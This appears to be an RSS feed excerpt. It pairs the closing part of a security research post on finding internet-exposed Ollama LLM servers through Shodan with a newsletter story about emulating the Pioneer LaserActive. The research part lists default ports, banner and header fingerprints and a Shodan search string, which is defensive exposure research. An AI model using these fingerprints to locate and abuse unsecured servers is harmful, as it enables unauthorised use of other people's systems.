    &lt;p&gt;To assess the real-world implications of these concerns, we leverage the Shodan search engine to identify exposed Ollama servers and evaluate their security configurations. Our investigation is guided by three primary contributions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Development of a proof-of-concept tool, written in Python, to detect exposed Ollama servers through Shodan queries&lt;/item&gt;
      &lt;item&gt;Analysis of identified instances evaluate authentication enforcement, endpoint exposure, and model accessibility&lt;/item&gt;
      &lt;item&gt;Recommendations for mitigating common vulnerabilities in LLM deployments, with a focus on practical security improvements&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Our findings reveal that a significant number of organizations and individuals expose their LLM infrastructure to the internet, often without realizing the implications. This creates avenues for misuse, ranging from resource exploitation to malicious prompt injection and data inference.&lt;/p&gt;
    &lt;head rend="h2"&gt;Methodology&lt;/head&gt;
    &lt;p&gt;The proposed system utilizes Shodan, a search engine that indexes internet-connected devices, to identify potentially vulnerable AI inference servers. This approach was selected with privacy and ethical considerations in mind, specifically to avoid the risks associated with directly scanning remote systems that may already be exposed or improperly secured. By relying on Shodan‚Äôs existing database of indexed endpoints, the system circumvents the need for active probing, thereby reducing the likelihood of triggering intrusion detection systems or violating acceptable use policies.&lt;/p&gt;
    &lt;p&gt;In addition to being more ethical, leveraging Shodan also provides a scalable and efficient mechanism for identifying LLM deployments accessible over the public internet. Manual enumeration or brute-force scanning of IP address ranges would be significantly more resource-intensive and potentially problematic from both legal and operational perspectives.&lt;/p&gt;
    &lt;p&gt;The system operates in two sequential stages. In the first stage, Shodan is queried to identify publicly accessible Ollama servers based on distinctive network signatures or banners. In the second stage, each identified endpoint is programmatically queried to assess its security posture, with a particular focus on authentication and authorization mechanisms. This includes evaluating whether endpoints require credentials, enforce access control, or expose model metadata and functionality without restriction.&lt;/p&gt;
    &lt;p&gt;An overview of the system architecture is illustrated in Figure 1, which outlines the workflow from endpoint discovery to vulnerability analysis.&lt;/p&gt;
    &lt;head rend="h2"&gt;Detecting Exposed Ollama Servers&lt;/head&gt;
    &lt;p&gt;Our approach focuses on identifying deployments of popular LLM hosting tools by scanning for default ports and service banners associated with each implementation. Below we provide a list of LLM platforms examined and their associated default ports, which are used as heuristics for identification:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Ollama / Mistral / LLaMA models ‚Äî Port 11434&lt;/item&gt;
      &lt;item&gt;vLLM ‚Äî Port 8000&lt;/item&gt;
      &lt;item&gt;llama.cpp ‚Äî Ports 8000, 8080&lt;/item&gt;
      &lt;item&gt;LM Studio ‚Äî Port 1234&lt;/item&gt;
      &lt;item&gt;GPT4All ‚Äî Port 4891&lt;/item&gt;
      &lt;item&gt;LangChain ‚Äî Port 8000&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using the Shodan API, the system retrieves metadata for hosts operating on these ports, including IP addresses, open ports, HTTP headers, and service banners. To minimize false positives, such as unrelated applications using the same ports, the developed system performs an additional filtering step based on banner content. For example, Ollama instances are verified using keyword matching against the service banner (e.g., port:11434 ‚ÄúOllama‚Äù), which increases confidence that the endpoint is associated with the targeted LLM tooling rather than an unrelated application using the same port.&lt;/p&gt;
    &lt;p&gt;During analysis, we identified an additional signature that enhanced the accuracy of fingerprinting Ollama deployments. Specifically, a significant proportion of the discovered Ollama instances were found to be running the Uvicorn ASGI server, a lightweight, Python-based web server commonly employed for serving asynchronous APIs. In such cases, the HTTP response headers included the field Server: ‚Äúuvicorn‚Äù, which functioned as a valuable secondary indicator, particularly when the service banner lacked an explicit reference to the Ollama platform. Conversely, our research also indicates that servers running Uvicorn are more likely to host LLM applications as this Python-based web server appears to be popular among software used for self-hosting LLMs.&lt;/p&gt;
    &lt;p&gt;This observation strengthens the resilience of our detection methodology by enabling the inference of Ollama deployments even in the absence of direct product identifiers. Given Uvicorn‚Äôs widespread use in Python-based microservice architectures and AI inference backends, its presence, especially when correlated with known Ollama-specific ports (e.g., 11434) substantially increases the confidence level that a host is serving an LLM-related application. A layered fingerprinting approach improves the precision of our system and reduces reliance on single-point identifiers that may be obfuscated or omitted.&lt;/p&gt;
    &lt;p&gt;The banner-based fingerprinting method draws from established principles in network reconnaissance and is a widely accepted approach in both academic research and penetration testing contexts. According to prior work in internet-wide scanning, service banners and default ports provide a reliable mechanism for characterizing software deployments at scale, albeit with limitations in environments employing obfuscation or non-standard configurations.&lt;/p&gt;
    &lt;p&gt;By combining port-based filtering with banner analysis and keyword validation, our system aims to strike a balance between recall and precision in identifying genuinely exposed LLM servers, thus enabling accurate and responsible vulnerability assessment.&lt;/p&gt;
    &lt;head rend="h2"&gt;Authorization and Authentication Assessment&lt;/head&gt;
    &lt;p&gt;Once a potentially vulnerable Ollama server is identified, we initiate a series of automated API queries to determine whether access controls are in place and whether the server responds deterministically to standardized test inputs. This evaluation specifically assesses the presence or absence of authentication enforcement and the model‚Äôs responsiveness to benign prompt injections, thereby providing insight into the system‚Äôs exposure to unauthorized use. To minimize operational risk and ensure ethical testing standards, we employ a minimal, non-invasive prompt structure as follows:&lt;/p&gt;
    &lt;p&gt;A successful HTTP 200 response accompanied by the correct result (e.g., ‚Äú4‚Äù) indicates that the server is accepting and executing prompts without requiring authentication. This represents a high-severity security issue, as it suggests that arbitrary, unauthenticated prompt execution is possible. In such cases, the system is exposed to a broad range of attack vectors, including the deployment and execution of unauthorized models, prompt injection attacks, and the deletion or modification of existing assets.&lt;/p&gt;
    &lt;p&gt;Moreover, unprotected endpoints may be subjected to automated fuzzing or adversarial testing using tools such as Promptfoo or Garak, which are designed to probe LLMs for unexpected behavior or latent vulnerabilities. These tools, when directed at unsecured instances, can systematically uncover unsafe model responses, prompt leakage, or unintended completions that may compromise the integrity or confidentiality of the system.&lt;/p&gt;
    &lt;p&gt;Conversely, HTTP status codes 401 (Unauthorized) or 403 (Forbidden) denote that access controls are at least partially enforced, often through default authentication mechanisms. While such configurations do not guarantee full protection, particularly against brute-force or misconfiguration exploits, they substantially reduce the immediate risk of casual or opportunistic exploitation. Nonetheless, even authenticated instances require scrutiny to ensure proper isolation, rate limiting, and audit logging, as part of a comprehensive security posture.&lt;/p&gt;
    &lt;head rend="h2"&gt;Findings&lt;/head&gt;
    &lt;p&gt;The results from our scans confirmed the initial hypothesis: a significant number of Ollama servers are publicly exposed and vulnerable to unauthorized prompt injection. Utilizing an automated scanning tool in conjunction with Shodan, we identified 1,139 vulnerable Ollama instances. Notably, the discovery rate was highest in the initial phase of scanning, with over 1,000 instances detected within the first 10 minutes, highlighting the widespread and largely unmitigated nature of this exposure.&lt;/p&gt;
    &lt;p&gt;Geospatial analysis of the identified servers revealed a concentration of vulnerabilities in several major regions. As depicted in Figure 3, the majority of exposed servers were hosted in the United States (36.6%), followed by China (22.5%) and Germany (8.9%). To protect the integrity and privacy of affected entities, IP addresses have been redacted in all visual documentation of the findings.&lt;/p&gt;
    &lt;p&gt;Out of the 1,139 exposed servers, 214 were found to be actively hosting and responding to requests with live models‚Äîaccounting for approximately 18.8% of the total scanned population with Mistral and LLaMA representing the most frequently encountered deployments. A review of the least common model names was also conducted, revealing what appeared to be primarily self-trained or otherwise customized LLMs. In some instances, the names alone provided enough information to identify the hosting party. To safeguard their privacy, tha names of these models have been excluded from the findings. These interactions confirm the feasibility of prompt-based interaction without authentication, and thus the risk of exploitation.&lt;/p&gt;
    &lt;p&gt;Conversely, the remaining 80% of detected servers, while reachable via unauthenticated interfaces, did not have any models instantiated. These ‚Äúdormant‚Äù servers, though not actively serving model responses, remain susceptible to exploitation via unauthorized model uploads or configuration manipulation. Importantly, their exposed interfaces could still be leveraged in attacks involving resource exhaustion, denial of service, or lateral movement.&lt;/p&gt;
    &lt;p&gt;An additional observation was the widespread adoption of OpenAI-compatible API schemas across disparate model hosting platforms. Among the discovered endpoints, 88.89% adhered to the standardized route structure used by OpenAI (e.g., v1/chat/completions), enabling simplified interoperability but also creating uniformity that could be exploited by automated attack frameworks. This API-level homogeneity facilitates the rapid development and deployment of malicious tooling capable of interacting with multiple LLM providers with minimal modification.&lt;/p&gt;
    &lt;p&gt;These findings showcase a critical and systemic vulnerability in the deployment of LLM infrastructure. The ease with which these servers can be located, fingerprinted, and interacted with raises urgent concerns regarding operational security, access control defaults, and the potential for widespread misuse in the absence of robust authentication and model access restrictions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Limitations&lt;/head&gt;
    &lt;p&gt;While the proposed system effectively identified a substantial number of exposed Ollama servers, several limitations should be acknowledged that may impact the completeness and accuracy of the results.&lt;/p&gt;
    &lt;p&gt;First, the detection process is inherently limited by Shodan‚Äôs scanning coverage and indexing frequency. Only servers already discovered and cataloged by Shodan can be analyzed, meaning any hosts outside its visibility, due to firewalls, opt-out policies, or geographical constraints remain undetected.&lt;/p&gt;
    &lt;p&gt;Secondly, the system relies on Shodan‚Äôs fingerprinting accuracy. If Ollama instances are configured with custom headers, reverse proxies, or stripped HTTP metadata, they may not be correctly classified by Shodan, leading to potential false negatives.&lt;/p&gt;
    &lt;p&gt;Third, the approach targets default and commonly used ports (e.g., 11434), which introduces a bias toward standard configurations. Servers running on non-standard or intentionally obfuscated ports are likely to evade detection entirely.&lt;/p&gt;
    &lt;p&gt;Finally, the analysis focuses exclusively on Ollama deployments and does not extend to other LLM hosting frameworks. While this specialization enhances precision within a narrow scope, it limits generalizability across the broader LLM infrastructure landscape.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mitigation Strategies&lt;/head&gt;
    &lt;p&gt;The widespread exposure of unauthenticated Ollama servers highlights the urgent need for standardized, practical, and layered mitigation strategies aimed at securing LLM infrastructure. Below, we propose a set of technical and procedural defenses, grounded in best practices and supported by existing tools and frameworks.&lt;/p&gt;
    &lt;head rend="h3"&gt;Enforce Authentication and Access Control&lt;/head&gt;
    &lt;p&gt;The most critical step in mitigating unauthorized access is the implementation of robust authentication mechanisms. Ollama instances, and LLM servers in general, should never be publicly exposed without requiring secure API key-based or token-based authentication. Preferably, authentication should be tied to role-based access control (RBAC) systems to limit the scope of what users can do once authenticated.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Enforce API key or OAuth2-based authentication&lt;/item&gt;
      &lt;item&gt;Tools/References: OAuth 2.0 Framework OWASP API Security Top 10&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Segmentation and Firewalling&lt;/head&gt;
    &lt;p&gt;Publicly exposing inference endpoints over the internet, particularly on default ports, dramatically increases the likelihood of being indexed by services like Shodan. LLM endpoints should be deployed behind network-level access controls, such as firewalls, VPCs, or reverse proxies, and restricted to trusted IP ranges or VPNs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use security groups, firewalls, and private subnets to isolate LLM services&lt;/item&gt;
      &lt;item&gt;Tools/References: AWS Security Best Practices, Zero Trust Architecture&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Rate Limiting and Abuse Detection&lt;/head&gt;
    &lt;p&gt;To prevent automated abuse and model probing, inference endpoints should implement rate limiting, throttling, and logging mechanisms. This can hinder brute-force attacks, prompt injection attempts, or resource hijacking.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Integrate API gateways (e.g., Kong, Amazon API Gateway) to enforce limits and monitor anomalous behavior&lt;/item&gt;
      &lt;item&gt;Tools/References: OWASP Rate Limiting Guide, Grafana for Monitoring&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Disable Default Ports and Obfuscate Service Banners&lt;/head&gt;
    &lt;p&gt;Default ports (e.g., 11434 for Ollama) make fingerprinting trivial. To complicate scanning efforts, operators should consider changing default ports and disabling verbose service banners in HTTP responses or headers (e.g., removing ‚Äúuvicorn‚Äù or ‚ÄúOllama‚Äù identifiers).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Modify default configurations to suppress identifiable metadata&lt;/item&gt;
      &lt;item&gt;Tools/References: Nginx reverse proxy configuration, systemd hardening&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Secure Model Upload and Execution Pipelines&lt;/head&gt;
    &lt;p&gt;Ollama and similar tools support dynamic model uploads, which, if unsecured, present a vector for model poisoning or backdoor injection. Model upload functionality should be restricted, authenticated, and ideally audited. All models should be validated against a hash or verified origin before execution.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use content whitelisting, digital signatures, or harsh verification for uploaded models&lt;/item&gt;
      &lt;item&gt;Tools/References: Model Card Toolkit, Secure Supply Chain principles from SLSA&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Continuous Monitoring and Automated Exposure Audits&lt;/head&gt;
    &lt;p&gt;Operators should implement continuous monitoring tools that alert when LLM endpoints become publicly accessible, misconfigured, or lack authentication. Scheduled Shodan queries or custom scanners can help detect regressions in deployment security.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use automated tools like Project Discovery‚Äôs naabu, or write custom Shodan monitoring scripts&lt;/item&gt;
      &lt;item&gt;Tools/References: Project Discovery Tools, Shodan Alert API&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;This study reveals a concerning landscape of insecure large language model deployments, with a particular focus on Ollama-based servers exposed to the public internet. Through the use of Shodan and a purpose-built detection tool, we identified over 1,100 unauthenticated LLM servers, a substantial proportion of which were actively hosting vulnerable models. These findings highlight a widespread neglect of fundamental security practices such as access control, authentication, and network isolation in the deployment of AI systems.&lt;/p&gt;
    &lt;p&gt;The uniform adoption of OpenAI-compatible APIs further exacerbates the issue, enabling attackers to scale exploit attempts across platforms with minimal adaptation. While only a subset of the exposed servers were found to be actively serving models, the broader risk posed by dormant yet accessible endpoints cannot be understated. Such infrastructure remains vulnerable to abuse through unauthorized model execution, prompt injection, and resource hijacking. Our work underscores the urgent need for standardized security baselines, automated auditing tools, and improved deployment guidance for LLM infrastructure.&lt;/p&gt;
    &lt;p&gt;Looking ahead, future work should explore the integration of multiple data sources, including Censys, ZoomEye, and custom Nmap-based scanners to improve discovery accuracy and reduce dependency on a single platform. Additionally, incorporating adaptive fingerprinting and active probing techniques could enhance detection capabilities in cases where servers use obfuscation or non-standard configurations. Expanding the system to identify deployments across a wider range of LLM hosting frameworks, such as Hugging Face, Triton, and vLLM, would further increase coverage and relevance. Finally, non-standard port detection and adversarial prompt analysis offer promising avenues for refining the system‚Äôs ability to detect and characterize hidden or evasive LLM deployments in real-world environments.&lt;/p&gt;
    &lt;p&gt;We‚Äôd love to hear what you think! Ask a question and stay connected with Cisco Security on social media.&lt;/p&gt;
    &lt;p&gt;Cisco Security Social Media&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45113418</guid></item><item><title>The 16-year odyssey it took to emulate the Pioneer LaserActive</title><link>https://www.readonlymemo.com/this-is-the-first-the-16-year-odyssey-of-time-money-wrong-turns-and-frustration-it-took-to-finally-emulate-the-pioneer-laseractive/</link><description>&lt;doc fingerprint="375edd552a02e395"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;"This is the first:" The 16 year odyssey of "time, money, wrong turns and frustration" it took to finally emulate the Pioneer LaserActive&lt;/head&gt;
    &lt;p&gt;In April 2009, a Sega fan decided to look into emulating the Mega LD, a quirky and little-known hybrid of Genesis and LaserDisc. This week he finished the job.&lt;/p&gt;
    &lt;p&gt;Hey there ROM readers! I've got an absolute whopper of a story this issue with a genuine longform dive into the emulation of the LaserActive, plus a bit of backstory on the new fan translation of the Cowboy Bebop game for PS2, plus your usual quick hits on emulator improvements, FPGA happenings and other fan translation progress. That means there's absolutely no more time or space to waste on this intro.&lt;/p&gt;
    &lt;p&gt;LET'S GET TO IT.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Big Two&lt;/head&gt;
    &lt;head rend="h3"&gt;1. The LaserActive "might be the last vintage home console of note which hadn't been emulated," but no longer&lt;/head&gt;
    &lt;p&gt;The story behind the birth of any new emulator has some common ingredients. Fearsome programming skills; hundreds or thousands of hours of thankless work; the drive to understand exactly how and why a piece of technology works. None of these things come without patience. But lifelong Sega fan Nemesis, who released the first-ever emulator for the Pioneer LaserActive this week ‚Äî 16 years after first pondering the idea ‚Äî had no choice but to be patient. Because for most of the last decade, emulating the LaserActive was simply impossible.&lt;/p&gt;
    &lt;p&gt;"All along the way, the video made things difficult," he says. "The hardware to capture the signal properly didn‚Äôt exist. The software to decode the captured signal properly didn‚Äôt exist. And finally, a format to store the decoded video in a form suitable for emulation, also didn‚Äôt exist."&lt;/p&gt;
    &lt;p&gt;There's no other game console quite like the Pioneer LaserActive, which was released in 1993, sold abysmally and was dead in the ground by 1996. That's not a unique story for a '90s game system, but the LaserActive kinda... wasn't one. It was a LaserDisc player with an expansion bay that owners could slot different modules into. One transformed the LaserActive into a karaoke machine. Another would give it the guts of a PC Engine. And a third added the brains of a Sega Genesis/Mega Drive, able to play Sega CD games as well as about two dozen made for the short-lived Mega LD.&lt;/p&gt;
    &lt;p&gt;The Mega LD format represented a technological leap over early LaserDisc-based arcade games like Dragon's Lair. The mid-'90s promise of FULL MOTION VIDEO GAMEPLAY may be quaint as hell today, but it's the reason the LaserActive has been impossible to emulate for 30 years. And it still would be today, if Nemesis hadn't spent much of the 21st century proactively collecting Sega hardware and Mega LD games with the goal of one day preserving them.&lt;/p&gt;
    &lt;p&gt;Nemesis's history with both games and emulation started with the Genesis (which I will refer to as the Mega Drive for the rest of this issue, out of respect for his native Australia). After owning a Mega Drive, 32X and Mega CD growing up, he played his first emulator, the Nesticle successor Genecyst, on a Pentium 133 circa 1997. That eventually led to contributing to reverse-engineering and emulation efforts.&lt;/p&gt;
    &lt;p&gt;"I did a lot of work on the YM2612 FM chip in the Mega Drive back in 2008 in particular, and a lot of Mega Drive emulators finally had decent FM sound after that as a result," he says. "Sharing that research, seeing the results made use of, and finally hearing the games I remembered from my childhood sound right for the first time, was a really good feeling."&lt;/p&gt;
    &lt;p&gt;In 2004, when buying loads of retro consoles was not yet a universal pasttime for nostalgic millenials and Gen Xers, he paid about $200 for one of the approximately 10,000 LaserActives that Pioneer manufactured in its short life, along with the Mega LD "PAC" module. Throughout the rest of the decade he scooped up every bit of Sega hardware he could get his hands on with an eye towards future reverse-engineering projects, but it wasn't until 2009 when he started thinking: Why isn't there an emulator for the LaserActive?&lt;/p&gt;
    &lt;p&gt;So he did what any retro game fan would do in 2009: started a forum thread about it.&lt;/p&gt;
    &lt;p&gt;"This system keeps popping into my mind," he wrote in the thread, which is still online today. "I don't think anyone's had a serious crack at emulating it yet, and I really don't think it would be very hard to do."&lt;/p&gt;
    &lt;p&gt;Well. About that.&lt;/p&gt;
    &lt;p&gt;"I honestly feel like I've nearly 'solved' this system half a dozen times over by now," Nemesis says here in 2025.&lt;/p&gt;
    &lt;p&gt;"The digital side of the system was actually pretty straightforward. When you break it down, the LaserActive is really more like a big oversized add-on to the console hardware. What that add-on provides is a different drive control interface, another audio source, and another video source, with mixing features to combine that video/audio with the console video/audio. That's really about it. On paper, it's pretty simple. In reality though, the LaserActive hardware did present a lot of challenges, mostly due to its inherent unreliability."&lt;/p&gt;
    &lt;p&gt;With prior experience writing a Genesis emulator of his own, Nemesis originally thought he'd be well-positioned to tackle the LaserActive. But the problem started to pile up immediately. First there were the almost 100 capacitors in the Sega PAC that were guaranteed to fail at some point, causing many to have to be replaced on even a mint condition system. Pioneer's cost-cutting inside the LaserDisc player caused other parts to break, too. Learning to fix the LaserActive was a necessary step to figuring out how it worked.&lt;/p&gt;
    &lt;p&gt;2011 was a year of progress. Nemesis:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Coded a program to load onto a Mega Drive flash cart that allowed him to "probe" the LaserActive hardware&lt;/item&gt;
      &lt;item&gt;Disassembled the system BIOS to identify that "ll the interaction with the LaserActive hardware happened over a custom register block"&lt;/item&gt;
      &lt;item&gt;Coded another program that allowed direct read/write access to those registers using a controller&lt;/item&gt;
      &lt;item&gt;With the help of other forumites, mapped most of the registers by comparing the system's actions to the code in the disassembldd BIOS and documented what it was doing&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The next two years were focused on figuring out how to rip the LaserActive's games. This involved writing multiple more custom programs and using a special USB-to-MD link cable to copy the digital data from the disc, which contained the game code as well as audio tracks. When that didn't prove to be enough to capture the TOC (or table of contents) data that essentially acted as a guide to how all the data on the disc was organized, he had to go deeper.&lt;/p&gt;
    &lt;p&gt;"I soldered a bunch of physical tapping wires into my Sega PAC-S10 module, and used a Saleae logic analyzer clone to do a streaming capture of the data lines when the TOC region was being read, which the hardware didn't make directly available. I wrote a program to parse the bus trace and extract the data from the raw capture and reconstruct the lead-in. At this point, I had everything I needed to rip a full bin/cue image of the digital data from a LaserDisc."&lt;/p&gt;
    &lt;p&gt;In 2014, Nemesis started soliciting other members of the forum where he chronicled the project to send him Mega LD games to dump (shout out to doc eggfan, who acquired most of the library including two Myst prototypes; "if he hadn't done that, there's a good chance they would have been lost forever). With a pile of games in hand, he bought a PC video capture card to rip the audio and video from the discs. And this is where the 2-3 people reading this who have an intimate understanding of the LaserActive will probably reflexively say "uh oh."&lt;/p&gt;
    &lt;p&gt;LaserDisc, despite looking like a jumbo DVD, is an analog video medium. No big deal if you're just capturing a movie. But for a game? Big big deal. Here's the long-form breakdown ‚Äî skip ahead if you don't want to get way deep into analog-to-digital misery.&lt;/p&gt;
    &lt;quote&gt;"No analog capture cards of the day were actually up to the task of what we were trying to do. ... The LaserActive has one of the fastest, most powerful control systems for LaserDisc playback ever made, and the game has direct, immediate control over it. Rarely is the player just playing back a video normally. Games will often have completely different video footage per field, with only one shown, or skip over every second frame, to mix four or more video streams in the same area of the disc. Many games use this for seamless 'branching' such as whether you go left or right, and this can change constantly and seamlessly during playback. The unit can play faster or slower, even playing in reverse, such as in Rocket Coaster as you speed up, or slide backwards down a slope. The unit can perform rapid nearly instant seeks with seamless looping, and does for games like Myst. In fact, the entire Myst title is basically using the LaserDisc as a set of random, short transitions, and still images, and other titles do this as well to differing degrees. ...&lt;lb/&gt;Games used the skip play features to further interleave different video streams at half the framerate between each other. Analog capture cards of the day didn't deal with this well. None of them could compress lossless video, everything was encoded to lossy formats. Most of them would assume a 480i image. This would cause the separate video streams in each field to 'bleed into' each other, destroying the image. The same problem occurred between frames when they had separate video streams interleaved together, where inter-frame compression would cause artifacts from the two streams to bleed together.&lt;lb/&gt;A high end Canopus capture card I had was the only one that was capable of compressing into huffyuv, not in a lossless form, but at least in a format that prevented this bleeding problem. Unfortunately, this card still had a limitation, in that it couldn't capture the VBI data. It was common in the day for special 'control codes' to be encoded into lines normally hidden on a normal TV, which contained information. In the case of LaserDiscs, it contained frame numbers, timecodes, picture stop codes, video TOC information in the lead-in, and other such data. None of that could be captured by capture cards of the day. For cards that had VBI capture features, they didn't work on LaserDiscs, since LaserDiscs used different lines/formats than other sources, and no capture cards in the world expected to be capturing LaserDisc video.&lt;lb/&gt;At this point, I felt like I'd hit a bit of a dead end. It could, perhaps, have been possible to cobble something together at this point in 2014, but I felt the result would be poor, and the discs would not have been properly preserved. I decided a different approach was needed for the analog video content, but the technology to do what I needed to do at this point, didn't seem to exist."&lt;/quote&gt;
    &lt;p&gt;With an increasingly busy home life thanks to two young kids, a long commute and demanding workload at the office, Nemesis did the only thing that made sense at that point. He put the LaserActive on the shelf.&lt;/p&gt;
    &lt;p&gt;Two years later, he took another stab at it by trying to build his own hardware capture setup. By tapping into the LaserActive directly, he was able to capture a full, raw composite video signal ‚Äî but it was useless unless he could decode it. Back on the shelf it went for another two years.&lt;/p&gt;
    &lt;p&gt;A house move, shorter commute and more balanced work-life, er, balance, later, Nemesis decided to dust off the LaserActive. Enter the Domesday Duplicator ‚Äî an open source, community-driven hardware project dedicated to ripping LaserDiscs.&lt;/p&gt;
    &lt;p&gt;Surely this was the capture solution he'd been waiting for. Turns out it was... but not in 2018. A key companion to the Domesday Duplicator, ld-decode, was then still "in its infancy." At the time there was no publicly available software solution to decoding composite video; by the time computers were fast enough to do it without dedicated hardware, analog was donezo. Nemesis went down the path of trying to write his own decoder to mixed results, but when he found out kid #4 was on the way, he decided to wait for the broader community effort to mature.&lt;/p&gt;
    &lt;p&gt;And it did mature by a lot, with both the Duplicator and ld-decode improving process of ripping LaserDiscs in the higest possible quality. But there was still a problem when it came to LaserActive discs ‚Äî they were interactive games, not static films. In 2020 Nemesis started chipping in to ld-decode:&lt;/p&gt;
    &lt;quote&gt;"I started pushing for the need to add extra features into the decode process. Until then, focus had been entirely around the requirements of capturing movies on LaserDiscs, as you'd expect. LaserActive games needed more though. I needed a way to capture the full lead-in, which stored the TOC data for both the analog video and the digital data. If you're just ripping a LaserDisc to an mp4, you don't need this info, but we do for emulation. I also needed the full 525 lines of NTSC video, with VBI data. That was stripped by ld-decode, they just cared about the visible region you'd see on a TV. I needed to deal with mixed-mode 'CD' images in the digital data track. They just needed audio tracks to work. I needed to be able to play through picture stop codes seamlessly without corrupting the audio data, they didn't need to worry about that. All kinds of things like this added up, to mean that ld-decode increasingly worked great for regular LaserDiscs, but still wasn't checking all the boxes for LaserActive games."&lt;/quote&gt;
    &lt;p&gt;Before he could fully commit to adding those features himself, COVID upended everything and the LaserActive went back into storage.&lt;/p&gt;
    &lt;p&gt;2024: 15 years after he'd first suggested emulating the LaserActive didn't seem like it'd be that tricky, set up in a new house with a new workspace, Nemesis finally vowed to finish what he'd started.&lt;/p&gt;
    &lt;p&gt;It was a year of whirlwind activity:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Using the LaserActive's test mode and a custom firmware mod he developed to properly capture the lead-in and lead-out from every disc&lt;/item&gt;
      &lt;item&gt;Rewriting the flaky USB capture code for the Domesday Duplicator's capture program to ensure error-free rips&lt;/item&gt;
      &lt;item&gt;Expanding the program's capabilities to record more data about the disc itself, the player, and the signal quality&lt;/item&gt;
      &lt;item&gt;Rewriting ld-decode's digital audio decoding, which had issues with drifting out of sync with the video, and finally making it possible to parse the TOC data&lt;/item&gt;
      &lt;item&gt;Improving the video decoding to output full frame data, with all 525 lines of NTSC video and the VBI data&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;"With all these bits in place, I was now able to rip discs and extract the actual contents in a form suitable for emulation," Nemesis says. 2024 ticked over to 2025, and he began removing LaserActive games from the sleeves they'd rested within for decades undisturbed. Most of them had been bought new and never opened; for years he'd resisted the urge, not wanting to risk even a tiny accidental scratch until everything was ready.&lt;/p&gt;
    &lt;p&gt;After so many years and so many obstacles, the final mile was, at long last, an easy run:&lt;/p&gt;
    &lt;quote&gt;"Most of the work reverse engineering the hardware I'd already done and published notes on over 13 years prior. I sat down and implemented the emulation code according to my notes, double checking things on the hardware as I went using the same testing program I'd written all those years ago, and filling the gaps in my notes for parts I hadn't fully mapped out. Space Berserker was quickly running, and after that, as more games finished decoding most of them worked on the first try, with no issues. Since I'd set out to emulate the complete hardware, with all its quirks and unusual features, whatever a game tried to do, it should just work. A few games flushed out some things I'd missed here and there, but mostly it was just fixing bugs in my implementation, until after a few weeks, everything was fully working in the emulator, just the same way it did on the hardware."&lt;/quote&gt;
    &lt;p&gt;Nemesis decided to write his LaserActive emulation as a component of multi-system emualtor Ares, partially out of respect for its late creator, Near. Its existing Mega Drive support made for an easy starting point, and current Ares maintainer Luke Usher had actually done some ground work to support the Mega LD in the future by creating a "skeleton" that defined it in relation to the Mega Drive and CD.&lt;/p&gt;
    &lt;p&gt;"It was all sitting there, just needed the actual code to be written to emulate the LaserActive hardware," Nemesis says. "I'd never touched the Ares code before, but having this delivered to me is what allowed me to get the basics of drive control to have Mega CD games booting in days, from work over a few evenings. Without that, there's a good chance I wouldn't have started when I did."&lt;/p&gt;
    &lt;p&gt;There's one final wrinkle to LaserActive emulation, and that's the disc image files themselves. Basically, they're huge, in the dozens of gigabytes range. And that, again, is because the way LaserActive games utvi makes them allergic to compression. They may want to jump to specific frames in an instant, play backwards, or interleave frames, all of which means a specific moment in time needs to be a keyframe, not a compressed, modified frame that only contains the small amount of data that's changed from the frame before it, which is how video files are greatly reduced in size. You could still compress a LaserActive game to about 10GB per size with every frame preserved as a keyframe...&lt;/p&gt;
    &lt;p&gt;"That still isn‚Äôt suitable though, as heavyweight video codecs are too intensive to decode alongside emulating an entire Mega Drive + MegaCD in realtime without involving hardware decoding," Nemesis says. "In order to keep everything running at 60fps, you have to be able to do everything in under 16ms per frame. Using hardware decoding would take decoding burden off the CPU, but the video mixing with the graphics output from the Mega Drive now becomes more complex, and you also now place specific GPU requirements on any system that‚Äôs going to try and play these games."&lt;/p&gt;
    &lt;p&gt;So they stuck to a lossless format that preserves quality and takes the pressure off the CPU (and puts none at all on a graphics card). Any system that can currently run Ares should have no trouble with the LaserActive, with the caveat that you'll definitely want to have these mondo files on an SSD rather than an old spinning platter to avoid any issues with read speeds.&lt;/p&gt;
    &lt;p&gt;Ares v146, released on August 26, marked the first time a Mega LD game has been playable on another system. And it represents a milestone in game preservation that could've easily been missed ‚Äî due to indifference, the literal string of inventions it took to make it a reality, or the inexorable march of time.&lt;/p&gt;
    &lt;p&gt;"There are other titles I don‚Äôt have access to at all, however I‚Äôm in discussions with a number of people who have offered to loan discs to help complete the dumping efforts," Nemesis says. "It‚Äôs been great to see people step up and offer to help. It‚Äôs vital this is done now, because Laserdisc titles don‚Äôt last forever. I have one disc in my possession that was a new, sealed copy, pressed in 1994, which is suffering from laser-rot. It‚Äôs likely that eventually, all Laserdiscs will be rendered unplayable, so we need to ensure these games are preserved now, while we still can."&lt;/p&gt;
